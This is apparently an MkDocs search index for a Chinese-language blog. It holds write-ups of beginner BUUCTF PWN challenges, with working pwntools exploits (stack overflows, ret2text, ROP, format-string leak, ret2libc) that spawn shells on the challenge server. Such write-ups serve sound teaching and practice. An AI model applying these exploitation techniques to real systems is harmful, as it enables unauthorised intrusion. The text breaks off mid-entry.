{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<ul> <li>\u8fd4\u56de\u535a\u5ba2\u9996\u9875\uff1aiyheart\u7684\u535a\u5ba2 - \u5206\u4eab\u7b14\u8bb0\u548c\u5b66\u4e60\u5386\u7a0b</li> </ul>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/","title":"\u7b2c\u4e00\u9875","text":"<ul> <li>\u7b2c\u4e00\u9875\u7ed3\u675f\uff0c\u9898\u76ee\u6bd4\u8f83\u57fa\u7840\uff0c\u4e00\u665a\u4e0a\u57fa\u672c\u4e0a\u5c31\u53ef\u4ee5\u5237\u5b8c\uff0c\u5e0c\u671b\u80fd\u5feb\u70b9\u5237\u5230\u5806</li> </ul>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#1_test_your_nc","title":"\u9898\u76ee1_test_your_nc","text":"<ul> <li>\u8003\u70b9\uff1a<code>nc</code>\u8fdc\u7a0b\u8fde\u63a5\uff0c\u8fde\u63a5\u547d\u4ee4\uff1a<code>nc ip port</code>\uff0c\u800c\u4e0d\u662f<code>nc ip:port</code></li> </ul>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#2_rip","title":"\u9898\u76ee2_rip","text":"<ul> <li>\u8003\u70b9\uff1a<code>ret2text</code></li> <li>\u4e0b\u8f7d\u9644\u4ef6\u540e\u76f4\u63a5\u9006\u5411\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a<code>gets()</code>\u51fd\u6570\uff0c\u5b58\u5728\u6808\u6ea2\u51fa</li> </ul> <ul> <li>\u540c\u65f6\u6211\u4eec\u53d1\u73b0\u4e86\u5b58\u5728\u5371\u9669\u51fd\u6570\uff0c\u5e76\u4e14\u6ca1\u6709\u5f00<code>pie</code></li> </ul> <ul> <li>\u6240\u4ee5\u5c31\u76f4\u63a5<code>ret2text</code>\uff0c\u672c\u9898exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./pwn1')\np = remote('node5.buuoj.cn',25590)\npayload = b'a'*(0xf+0x8)\npayload += p64(0x40118A)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#3_warmup_csaw_2016","title":"\u9898\u76ee3_warmup_csaw_2016","text":"<ul> <li>\u8003\u70b9\uff1a<code>ret2text</code></li> <li>\u67e5\u770b\u4fdd\u62a4\uff0c\u53d1\u73b0\u4fdd\u62a4\u5168\u6ca1\u5f00</li> </ul> <ul> <li>\u4e0b\u8f7d\u9644\u4ef6\u540e\u76f4\u63a5\u5728\u4f7f\u7528<code>IDA</code>\u67e5\u770b\u53cd\u7f16\u8bd1\u7684\u4ee3\u7801\uff0c\u5b58\u5728<code>gets</code>\u51fd\u6570\uff0c\u53ef\u4ee5\u6808\u6ea2\u51fa</li> </ul> <ul> <li>\u53d1\u73b0<code>sprintf</code>\u4f1a\u8f93\u51fa<code>sub_40060D</code>\u8fd9\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u6211\u4eec\u6765\u67e5\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u7c7b\u4f3c\u4e8e\u540e\u95e8\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230<code>flag</code>\u3002</li> </ul> <ul> <li>\u76f4\u63a5\u6808\u6ea2\u51fa<code>ret2text</code>\uff0cexp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./pwn1')\np = remote('node5.buuoj.cn',29233)\npayload = b'a'*(0x40+0x8)\npayload += p64(0x40060D)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#4_ciscn_2019_n_1","title":"\u9898\u76ee4_ciscn_2019_n_1","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6808\u6ea2\u51fa</code></li> <li>\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u7136\u540e\u76f4\u63a5<code>IDA pro</code>\u53cd\u7f16\u8bd1\u4e00\u4e0b\u8fd9\u4e2a\u7a0b\u5e8f\u67e5\u770b\u4ee3\u7801\u3002\u53d1\u73b0<code>main</code>\u51fd\u6570\u5c31\u8fd9\u6837\u8f93\u5165\u8f93\u51fa\u521d\u59cb\u5316\u4e00\u4e0b\uff0c\u7136\u540e\u8c03\u7528<code>func()</code>\u51fd\u6570</li> </ul> <ul> <li>\u67e5\u770b<code>func</code>\u51fd\u6570\uff0c\u53d1\u73b0\u5b58\u5728<code>gets()</code>\uff0c\u8fd8\u6709<code>v2</code>\u4e0e<code>11.28125</code>\u6bd4\u8f83\u5c31\u80fd\u5f97\u5230<code>flag</code></li> </ul> <ul> <li>\u76f4\u63a5\u67e5\u770b\u6570\u636e\u6bb5\uff0c\u53d1\u73b0<code>11.28125</code>\u7684\u6d6e\u70b9\u6570\u5341\u516d\u8fdb\u5236\u8868\u793a\u5982\u4e0b\uff1a</li> </ul> <ul> <li>\u6240\u4ee5\u76f4\u63a5\u6ea2\u51fa\u4fee\u6539\u53d8\u91cf\u5373\u53ef</li> </ul> <pre><code>from pwn import *\n#p = process('./ciscn_2019_n_1')\np = remote('node5.buuoj.cn',25249)\npayload = b'a'*(0x30-0x4)\npayload += p64(0x41348000)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#5_pwn1_sctf_2016","title":"\u9898\u76ee5_pwn1_sctf_2016","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>ret2text</code></p> </li> <li> <p>\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236\uff0c\u53d1\u73b0\u5982\u4e0b\u4fdd\u62a4\u673a\u5236\uff0c\u5e76\u4e14\u662f\u4e00\u4e2a<code>32</code>\u4f4d\u7a0b\u5e8f</p> </li> </ul> <p></p> <ul> <li>\u76f4\u63a5\u4f7f\u7528<code>IDA pro</code>\u53cd\u7f16\u8bd1\u8fd9\u4e2a\u7a0b\u5e8f\u3002\u53d1\u73b0\u662f\u4e00\u4e2a<code>C++</code>\u8bed\u8a00\u7684\u7a0b\u5e8f\uff0c\u5e76\u4e14<code>main</code>\u51fd\u6570\u5982\u4e0b\uff1a</li> </ul> <p></p> <ul> <li>\u67e5\u770b\u4e00\u4e0b<code>vuln()</code>\u51fd\u6570</li> </ul> <p></p> <ul> <li>\u8fd9\u4e2a\u7a0b\u5e8f\u6211\u4eec\u6b63\u5e38\u8f93\u5165\u662f\u6ca1\u529e\u6cd5\u6ea2\u51fa\u7684\uff0c\u4f46\u662f\u8fd9\u8fb9\u5982\u679c\u8f93\u5165<code>I</code>\u7684\u8bdd\u4f1a\u66ff\u6362\u6210\u4e09\u4e2a\u5b57\u7b26<code>you</code>\u3002\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c\u6808\u6ea2\u51fa\u64cd\u4f5c\u3002</li> </ul> <p></p> <ul> <li>\u63a5\u4e0b\u6765\u5c31\u662f\u8ba1\u7b97\u504f\u79fb\u4e86</li> </ul> <p>\u200b   </p> <ul> <li>\u8ba1\u7b97\u5f97\u5230\u504f\u79fb</li> </ul> <pre><code>b'I'*(21)+b'a'\n</code></pre> <ul> <li>\u6240\u4ee5exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./pwn1_sctf_2016')\np = remote('node5.buuoj.cn',27730)\npayload = b'I'*(21)+b'a'\npayload += p32(0x8048F0D)\np.sendline(payload)\np.interactive()\n</code></pre> <p></p>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#6_jarvisoj_level0","title":"\u9898\u76ee6_jarvisoj_level0","text":"<ul> <li>\u8003\u70b9\uff1a<code>ret2text</code>\u3001<code>\u6808\u5bf9\u9f50</code></li> <li>\u5148\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236\uff0c\u4fdd\u62a4\u673a\u5236\u5982\u4e0b</li> </ul> <ul> <li>\u7136\u540e\u5c31\u9006\u5411\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u67e5\u770b\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u8fd0\u884c\u903b\u8f91\u3002\u5148\u770b<code>main</code>\u51fd\u6570</li> </ul> <ul> <li>\u67e5\u770b<code>return</code>\u7684\u8fd9\u4e2a\u51fd\u6570\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e</li> </ul> <ul> <li>\u540c\u65f6\u8fd9\u91cc\u8fd8\u5b58\u5728<code>shell</code></li> </ul> <ul> <li>\u76f4\u63a5<code>ret2text</code>\uff0c\u6ce8\u610f\u5728\u6ea2\u51fa\u8fd4\u56de\u5230<code>shell</code>\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u6808\u9700\u8981\u4e0e<code>0x10</code>\u5bf9\u9f50\uff0c\u5426\u5219\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u6267\u884c<code>system(\"/bin/sh\")</code>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\np = process('./level0')\n#p = remote('node5.buuoj.cn',27730)\npayload = b'a'*0x80 + b'a'*0x8 + p64(0x4005A5)+p64(0x400596)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#7_2019-pwn5","title":"\u9898\u76ee7_[\u7b2c\u4e94\u7a7a\u95f42019 \u51b3\u8d5b]PWN5","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u968f\u673a\u6570</code>\u3001<code>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e</code></li> <li>\u5148\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u73b0\u5728\u9006\u5411\u4e00\u4e0b\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u53d1\u73b0\u662f\u76f4\u63a5\u83b7\u53d6\u7a0b\u5e8f\u968f\u673a\u6570\uff0c\u7136\u540e\u5c06\u968f\u673a\u6570\u5199\u5165\u5230<code>bss</code>\u6bb5\u4e2d\u3002</li> <li>\u4e4b\u540e\u8ba9\u7528\u6237\u8f93\u5165\u4e24\u6b21\uff0c\u7b2c\u4e00\u6b21\u8f93\u5165\u7684\u65f6\u5019\u4f1a\u6709\u4e00\u6b21\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e</li> <li>\u7b2c\u4e8c\u6b21\u8f93\u5165\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u6570\uff0c\u5c06\u8be5\u6570\u4e0e\u968f\u673a\u6570\u8fdb\u884c\u5224\u65ad\uff0c\u76f8\u7b49\u5c31\u53ef\u4ee5\u5f97\u5230<code>shell</code></li> </ul> <ul> <li>\u76f4\u63a5\u5148\u5199\u5165<code>bss</code>\u6bb5\u5b58\u50a8\u968f\u673a\u6570\u7684\u5730\u5740\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u4f7f\u7528<code>%s</code>\u8fdb\u884c\u6cc4\u9732\uff0c\u73b0\u5728\u8ba1\u7b97\u504f\u79fb\uff0c\u786e\u5b9a\u504f\u79fb\u4e3a<code>10</code></li> </ul> <ul> <li>\u76f4\u63a5\u4f7f\u7528<code>%10$s</code>\u5199\u5165\u968f\u673a\u6570\uff0c\u8fd9\u65f6\u6211\u4eec\u63a5\u6536\u968f\u673a\u6570\u8f93\u5165\u5230\u90a3\u8fb9\u5373\u53ef\u5f97\u5230<code>shell</code>\uff0c\u6ce8\u610f\u6211\u4eec\u53d1\u9001\u7684\u65f6\u5019\u8981\u5b57\u7b26\u4e32<code>ascii</code>\u7801\u5f62\u5f0f\uff0c\u56e0\u4e3a\u540e\u9762\u6709<code>atoi()</code>\u8fd9\u4e2a\u51fd\u6570\u3002</li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./pwn')\np = remote('node5.buuoj.cn',26635)\npayload =  p32(0x804C044) + b'%10$s'\n#gdb.attach(p)\n#pause()\np.sendline(payload)\np.recvuntil(b'Hello,')\nleak = p.recvline()[4:-1]\nprint('leak---&gt;',leak)\nleak = int.from_bytes(leak,'little')\np.send(str(leak).encode('utf-8'))\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#8_jarvisoj_level2","title":"\u9898\u76ee8_jarvisoj_level2","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>ret2text</code>\u3001<code>32\u4f4drop\u94fe</code></p> </li> <li> <p>\u5148\u68c0\u67e5\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236</p> </li> </ul> <p></p> <ul> <li>\u5f00\u59cb\u9006\u5411\u7a0b\u5e8f\uff0c\u5148\u67e5\u770b<code>main</code>\u51fd\u6570\uff0c\u53d1\u73b0\u6709<code>system</code>\u51fd\u6570\uff0c\u5e76\u4e14\u6709\u4e00\u4e2a<code>vulnerable_function()</code>\u51fd\u6570</li> </ul> <p></p> <ul> <li>\u67e5\u770b<code>vulnerable_function()</code>\u51fd\u6570\uff0c\u53d1\u73b0\u5b58\u5728\u6808\u6ea2\u51fa</li> </ul> <p></p> <ul> <li>\u8fd9\u65f6\u7ffb\u627e\u5b57\u7b26\u4e32\uff0c\u53d1\u73b0\u8fd8\u5b58\u5728<code>/bin/sh</code>\u5b57\u7b26\u4e32\uff0c\u8fd9\u6837\u6211\u4eec\u901a\u8fc7\u6808\u6ea2\u51fa\u5c31\u53ef\u4ee5\u6267\u884c<code>system(\"/bin/sh\")</code></li> </ul> <p></p> <ul> <li>\u8fd9\u65f6\u76f4\u63a5\u6784\u9020<code>32\u4f4drop\u94fe</code>\uff0c\u6ce8\u610f\u8fd4\u56de\u5230<code>call System</code>\u548c\u8fd4\u56de\u5230<code>system</code>\u7684<code>plt</code>\u8868\u5e03\u7f6e\u6808\u8fd8\u7a0d\u5fae\u6709\u70b9\u533a\u522b\uff0c\u4e3b\u8981\u5c31\u662f\u8fd4\u56de\u5230<code>system</code>\u7684<code>plt</code>\u8fd8\u8981\u586b\u5145\u4e00\u4e2a<code>p32(0xdeadbeff)</code>\u4f5c\u4e3a\u8fd4\u56de\u5730\u5740\uff0c\u7136\u540e\u518d\u5199\u5165<code>sh_addr</code></li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./level2')\np = remote('node5.buuoj.cn',29574)\nsh_addr = 0x804A024\nsys_addr = 0x804845C\npayload = b'a'*(0x88+0x4) + p32(sys_addr)+ p32(sh_addr)\np.sendline(payload)\np.interactive()\n</code></pre> <p></p> <p></p>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#9_ciscn_2019_n_8","title":"\u9898\u76ee9_ciscn_2019_n_8","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6ea2\u51fa\u6f0f\u6d1e</code></li> <li>\u5148\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u5206\u6790\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7b80\u5355\u7684\u6808\u6ea2\u51fa\u64cd\u4f5c\u3002</li> </ul> <ul> <li>\u786e\u8ba4\u504f\u79fb\u5373\u53ef\uff0c\u518d\u8f93\u5165<code>17</code>\u5373\u53ef<code>getshell</code></li> </ul> <pre><code>from pwn import *\np = process('./ciscn_2019_n_8')\n#p = remote('node5.buuoj.cn',29574)\npayload = p32(0x0)*13 + p64(17)\ngdb.attach(p)\npause()\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#10_bjdctf_2020_babystack","title":"\u9898\u76ee10_bjdctf_2020_babystack","text":"<ul> <li>\u8003\u70b9\uff1a<code>ret2text</code></li> <li>\u5148\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u53d1\u73b0\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u8f93\u5165\u7684\u5b57\u8282\u6570\uff0c\u8fd9\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u6ea2\u51fa</li> </ul> <ul> <li>\u73b0\u5728\u67e5\u770b\u6808\u4e0a\u5e03\u5c40\uff0c\u53d1\u73b0\u6211\u4eec\u5728\u6ea2\u51fa\u7684\u65f6\u5019\u4f1a\u4fee\u6539\u6211\u4eec\u8f93\u5165\u7684\u5b57\u8282\u6570</li> </ul> <ul> <li>\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u8981\u6ce8\u610f\u6ea2\u51fa\u7684\u5185\u5bb9\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u51fa\u73b0\u6ea2\u51fa\u5b8c<code>nbytes</code>\u5c31\u4e0d\u80fd\u518d\u6ea2\u51fa\u7684\u95ee\u9898\u3002</li> <li> <p>\u8fd8\u9700\u8981\u6ce8\u610f\u6808\u5bf9\u9f50\u7684\u95ee\u9898</p> </li> <li> <p>exp\u5982\u4e0b\uff1a</p> </li> </ul> <pre><code>from pwn import *\n#p = process('./bjdctf_2020_babystack')\np = remote('node5.buuoj.cn',26437)\np.sendline(b'50')\npayload = b'a'*0x10 + b'a'*0x8 + p64(0x4006FA) + p64(0x4006E6)\n#gdb.attach(p)\n#pause()\np.sendline(payload)\np.interactive()\n</code></pre> <p></p> <p></p>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#11_ciscn_2019_c_1","title":"\u9898\u76ee11_ciscn_2019_c_1","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6808\u6ea2\u51fa</code>\u3001<code>ret2libc</code></li> <li>\u5148\u6765\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u7136\u540e\u76f4\u63a5\u5f00\u59cb\u9006\u5411\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u67e5\u770b<code>main</code>\u51fd\u6570\u3002\u53d1\u73b0\u4e3b\u8981\u5c31\u662f\u4e00\u4e2a\u52a0\u5bc6\u7684\u9009\u9879</li> </ul> <ul> <li>\u67e5\u770b<code>begin()</code>\u51fd\u6570\u7a0b\u5e8f\u4e2d\u53ea\u5b9e\u73b0\u4e86\uff0c\u9009\u9879<code>1</code>\uff0c\u5e76\u4e14\u89e3\u5bc6\u9009\u9879\u6ca1\u6709\u5b9e\u73b0\u3002</li> </ul> <ul> <li>\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u67e5\u770b\u8fd9\u4e2a<code>Encrypt()</code>\u51fd\u6570\uff0c\u53d1\u73b0\u8fd9\u4e2a\u51fd\u6570\u4f1a\u6709\u4e00\u4e2a<code>gets()</code>\u51fd\u6570\uff0c\u5b58\u5728\u6808\u6ea2\u51fa\u3002</li> <li>\u5e76\u4e14\u518d\u8f93\u5165\u5b8c\u7a0b\u5e8f\u5185\u5bb9\u65f6\uff0c\u4f1a\u5bf9\u8f93\u5165\u7684\u5185\u5bb9\u8fdb\u884c\u5f02\u6216\u52a0\u5bc6</li> </ul> <ul> <li>\u8fd9\u65f6\u6211\u4eec\u6784\u9020<code>rop</code>\u94fe\u7684\u65f6\u5019\u5c31\u9700\u8981\u8f93\u5165\u5f02\u6216\u4e4b\u540e\u7684\u5185\u5bb9\u3002\u7136\u540e\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u6ca1\u6709\u73b0\u6210\u7684<code>shell</code>\u51fd\u6570\u3002</li> <li>\u6216\u8005\u8fd8\u6709\u4e00\u79cd\u529e\u6cd5\u5c31\u662f\u4f7f\u7528<code>\\x00</code>\u8fdb\u884c\u622a\u65ad\uff0c\u8fd9\u6837<code>rop</code>\u94fe\u5c31\u4e0d\u4f1a\u88ab\u52a0\u5bc6\u3002\u672c\u9898\u4f7f\u7528\u8fd9\u79cd\u6253\u6cd5\u3002</li> <li>\u6b64\u65f6\u6211\u4eec\u5c31\u9700\u8981\u6253<code>ret2libc</code></li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./ciscn_2019_c_1')\nlibc = ELF('./libc-2.27.so')\np = remote('node5.buuoj.cn',25616)\npop_rdi = 0x400c83\nret = 0x4006b9\nputs_plt = 0x4006E0\nputs_got = 0x602020\nencrypt = 0x4009A0\npayload = b'a'*0x1 + b'\\x00' + b'a'*(0x50-2)+ b'a'*0x8\npayload+= p64(ret) + p64(pop_rdi) + p64(puts_got)\npayload+= p64(puts_plt) + p64(encrypt)\np.sendline(b'1')\n#gdb.attach(p)\n#pause()\np.sendline(payload)\np.recvuntil(b'l\\n')\nleak = p.recvline()[:-1]\nprint('leak---&gt;',leak)\nputs_addr = int.from_bytes(leak,'little')\nlibc_addr = puts_addr - libc.symbols['puts']\nsys_addr = libc_addr + libc.symbols['system']\nsh_addr = libc_addr + next(libc.search(b'/bin/sh\\x00'))\npayload = b'a'*0x1 + b'\\x00' + b'a'*(0x50-2)+ b'a'*0x8\npayload+= p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)\np.sendline(payload)\n#p.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#12_jarvisoj_level2_x64","title":"\u9898\u76ee12_jarvisoj_level2_x64","text":"<ul> <li>\u8003\u70b9\uff1a<code>ret2text</code>\u3001<code>\u7b80\u535564\u4f4drop\u94fe</code></li> <li>\u5148\u67e5\u770b\u4e00\u4e0b\u68c0\u67e5\u673a\u5236</li> </ul> <ul> <li>\u76f4\u63a5\u9006\u5411\u7a0b\u5e8f\uff0c\u67e5\u770b<code>main</code>\u51fd\u6570\uff0c\u53ea\u8c03\u7528\u4e86\u8fd9\u4e2a\u51fd\u6570\uff0c\u53d1\u73b0\u6709<code>system()</code></li> </ul> <ul> <li>\u67e5\u770b<code>vulnerable_function()</code>\u51fd\u6570\uff0c\u53d1\u73b0\u5b58\u5728\u6808\u6ea2\u51fa</li> </ul> <ul> <li>\u5e76\u4e14\u53d1\u73b0\u6709<code>/bin/sh</code></li> </ul> <ul> <li>\u7b80\u5355<code>rop</code>\u94fe\u6784\u9020\u5373\u53ef\uff0cexp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\np = process('./level2_x64')\np = remote('node5.buuoj.cn',25772)\npop_rdi = 0x4006b3\nsh_addr = 0x600A90\nsys_addr = 0x40063E\npayload = b'a'*0x88 + p64(pop_rdi)\npayload+= p64(sh_addr) + p64(sys_addr)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#13_get_started_3dsctf_2016","title":"\u9898\u76ee13_get_started_3dsctf_2016","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6808\u6ea2\u51fa</code>\u3001<code>32\u4f4d\u53c2\u6570\u8c03\u7528</code>\u3001<code>\u5168\u7f13\u51b2\u8f93\u51fa</code>\u3001<code>\u9759\u6001\u7f16\u8bd1</code></li> <li>\u5148\u67e5\u770b\u4fdd\u62a4\u673a\u5236\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a<code>32</code>\u4f4d\u7a0b\u5e8f</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f\uff0c\u67e5\u770b<code>main</code>\u51fd\u6570\uff0c\u53d1\u73b0<code>main</code>\u51fd\u6570\u5b58\u5728\u6808\u6ea2\u51fa</li> </ul> <ul> <li>\u5e76\u4e14\u6211\u4eec\u67e5\u770b\u51fd\u6570\u4f1a\u53d1\u73b0\uff0c\u6709\u4e00\u4e2a<code>get_flag</code>\u7684\u51fd\u6570\uff0c\u5f53\u51fd\u6570\u6ee1\u8db3\u6761\u4ef6\u7684\u65f6\u5019\u5c31\u4f1a<code>get flag</code></li> </ul> <ul> <li>\u601d\u8def\u5c31\u662f\u76f4\u63a5\u6808\u6ea2\u51fa\u4fee\u6539\u53c2\u6570\uff0c\u7136\u540e\u8fd4\u56de\u5230<code>get flag</code>\u8fd9\u4e2a\u51fd\u6570\u4e2d</li> <li>\u5728\u6253\u7684\u8fc7\u7a0b\u4e2d\u9700\u8981\u6ce8\u610f\uff0c<code>32</code>\u4f4d\u53c2\u6570\u4f20\u9012\u662f\u4ece\u53f3\u5411\u5de6\u4f9d\u6b21\u4f20\u5165\u6808\u4e2d\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u53c2\u6570\u5728\u6700\u4f4e\u6808\u5730\u5740\u4e2d\u3002</li> <li>\u8fd8\u8981\u6ce8\u610f\u4e00\u70b9\u5c31\u662f\uff0c\u8fd9\u9898\u5e76\u6ca1\u6709\u5f00\u542f<code>\u65e0\u7f13\u51b2\u8f93\u51fa</code>\uff0c\u6240\u4ee5\u5728\u8c03\u7528\u5b8c<code>get flag</code>\u51fd\u6570\u65f6\uff0c\u6211\u4eec\u9700\u8981\u8fd4\u56de\u5230<code>main</code>\u51fd\u6570\uff0c\u518d\u8fdb\u884c\u6808\u6ea2\u51fa\uff0c\u8c03\u7528<code>fflush(0)</code>\uff0c\u5237\u65b0\u7f13\u51b2\u533a\u3002</li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\n#p = process('./get_started_3dsctf_2016')\np = remote('node5.buuoj.cn',28601)\npayload = b'a'*0x38 +p32(0x080489A0)\npayload+= p32(0x8048A20) + p32(0x308CD64F)+p32(0x195719D1)\n#gdb.attach(p)\n#pause()\np.sendline(payload)\npayload = b'a'*0x38 +p32(0x804F3E0)\npayload+=  p32(0)+p32(0)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#14_harekazectf2019baby_rop","title":"\u9898\u76ee14_[HarekazeCTF2019]baby_rop","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6808\u6ea2\u51fa</code>\u3001<code>64\u4f4d\u7b80\u5355rop\u94fe</code></li> <li>\u68c0\u67e5\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u76f4\u63a5\u9006\u5411\u7a0b\u5e8f\uff0c\u67e5\u770b<code>main</code>\u51fd\u6570\uff0c\u53d1\u73b0\u6709<code>system()</code>\u51fd\u6570\u548c\u4e00\u4e2a\u6808\u6ea2\u51fa\u64cd\u4f5c</li> </ul> <ul> <li>\u7136\u540e\u8fd8\u53d1\u73b0\u4e86<code>/bin/sh\\x00</code>\u8fd9\u4e2a\u5b57\u7b26\u4e32</li> </ul> <ul> <li>\u76f4\u63a5\u6808\u6ea2\u51fa\u6784\u9020<code>rop</code>\u94fe</li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\n#p = process('./babyrop')\npop_rdi = 0x400683\np = remote('node5.buuoj.cn',27158)\npayload = b'a'*(0x10+0x8)\npayload+= p64(pop_rdi)\npayload+= p64(0x601048)\npayload+= p64(0x4005E3)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#15_others_shellcode","title":"\u9898\u76ee15_others_shellcode","text":"<ul> <li>\u8003\u70b9\uff1a\u521d\u6b65\u4e86\u89e3<code>32\u4f4d\u7a0b\u5e8f\u7684\u7cfb\u7edf\u8c03\u7528</code></li> <li>\u5148\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u5148\u9006\u5411\u7a0b\u5e8f\uff0c\u67e5\u770b\u4e00\u4e0b<code>main</code>\u51fd\u6570</li> </ul> <ul> <li>\u518d\u67e5\u770b\u4e00\u4e0b<code>getShell()</code>\uff0c\u53d1\u73b0<code>eax = 11</code>\u3001<code>v1=\"/bin/sh\\x00\"</code>\uff0c\u7136\u540e\u8fdb\u884c<code>int 0x80</code>\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528</li> </ul> <ul> <li>\u672c\u9898\u5c31\u662f\u4e86\u89e3\u4e00\u4e0b\u7cfb\u7edf\u8c03\u7528\uff0cnc\u5373\u53ef<code>getshell</code>,\u6545\u672c\u9898\u65e0<code>exp</code></li> </ul>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#16_ogeek2019babyrop","title":"\u9898\u76ee16_[OGeek2019]babyrop","text":"<ul> 